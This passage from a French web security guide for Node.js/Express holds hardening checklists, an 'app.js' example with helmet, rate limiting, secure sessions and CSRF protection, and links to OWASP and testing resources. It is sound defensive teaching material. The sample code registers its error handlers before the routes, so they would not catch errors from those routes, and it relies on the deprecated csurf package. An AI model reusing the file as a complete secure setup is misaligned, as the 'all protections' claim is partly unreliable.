- [ ] **Content Security Policy** (CSP) configuré
- [ ] **Logs** des tentatives de connexion échouées
- [ ] **Sanitization HTML** (DOMPurify) si HTML utilisateur autorisé
- [ ] **2FA** (authentification à deux facteurs) pour les admins
- [ ] **Expiration** des sessions (max 24h)
- [ ] **Régénération** de l'ID de session après connexion
- [ ] **Protection** des routes admin avec middleware
- [ ] **Monitoring** des erreurs (Sentry, LogRocket)
- [ ] **Sauvegardes** régulières de la base de données

### 🟡 Niveau Moyen (Recommandé)

- [ ] **Tests de sécurité** automatisés (OWASP ZAP, Burp Suite)
- [ ] **Politique de mot de passe** forte (min 8 caractères, complexité)
- [ ] **Captcha** sur les formulaires publics (reCAPTCHA)
- [ ] **Emails de notification** pour actions sensibles
- [ ] **Limitation** de la taille des uploads
- [ ] **Scan** des fichiers uploadés (antivirus)
- [ ] **Logs d'audit** des actions administrateurs

---

## 🔧 Configuration Complète de Sécurité

Voici un fichier `app.js` avec **toutes les protections** :

```javascript
import express from "express";
import session from "express-session";
import pgSession from "connect-pg-simple";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import csrf from "csurf";
import "dotenv/config";
import pool from "./config/database.js";

const app = express();
const PgStore = pgSession(session);

// ✅ 1. Parseurs de requêtes
app.use(express.json({ limit: "10mb" })); // Limiter la taille
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// ✅ 2. Headers de sécurité (Helmet)
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  }),
);

// ✅ 3. Rate Limiting
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 500, // 500 requêtes max
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 tentatives de connexion
  message: "Trop de tentatives. Réessayez dans 15 minutes.",
});

app.use(generalLimiter);
app.post("/login", loginLimiter);

// ✅ 4. Sessions sécurisées
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    store: new PgStore({
      pool: pool,
      tableName: "session",
      createTableIfMissing: true,
    }),
    cookie: {
      maxAge: 1000 * 60 * 60 * 24, // 24h
      httpOnly: true, // Protection XSS
      secure: process.env.NODE_ENV === "production", // HTTPS only
      sameSite: "strict", // Protection CSRF
    },
    resave: false,
    saveUninitialized: false,
  }),
);

// ✅ 5. Protection CSRF
const csrfProtection = csrf({ cookie: false });
app.use(csrfProtection);
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});

// ✅ 6. Gestion des erreurs sécurisée
if (process.env.NODE_ENV === "production") {
  app.use((error, req, res, next) => {
    console.error("Erreur serveur:", error);
    res.status(500).json({ error: "Erreur serveur" });
  });
} else {
  app.use((error, req, res, next) => {
    res.status(500).json({
      error: error.message,
      stack: error.stack,
    });
  });
}

// ✅ 7. Routes
import router from "./routes/index.js";
app.use(router);

// ✅ 8. Démarrage sécurisé
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`✅ Serveur démarré sur le port ${PORT}`);
  console.log(`🔒 Environnement: ${process.env.NODE_ENV}`);

  if (process.env.NODE_ENV === "production") {
    console.log("🛡️ Toutes les protections de sécurité sont actives");
  } else {
    console.warn(
      "⚠️ Mode développement : certaines protections sont désactivées",
    );
  }
});
```

---

## 🔗 Ressources Complémentaires

### 📚 Documentation officielle

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

### 🛠️ Outils de Test

- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnérabilités
- [Burp Suite](https://portswigger.net/burp) - Test de sécurité web
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Audit des dépendances
- [Snyk](https://snyk.io/) - Détection de vulnérabilités

### 📖 Formations

- [HackTheBox](https://www.hackthebox.com/) - Entraînement pratique
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Apprentissage sécurité web
- [PortSwigger Academy](https://portswigger.net/web-security) - Cours gratuits

### 🔐 Générateurs

- [Password Generator](https://passwordsgenerator.net/) - Mots de passe forts
- [CSP Generator](https://report-uri.com/home/generate) - Content Security Policy
- [SSL Labs](https://www.ssllabs.com/ssltest/) - Test de configuration SSL/TLS

---

_Dernière mise à jour : 24/01/2026_

---
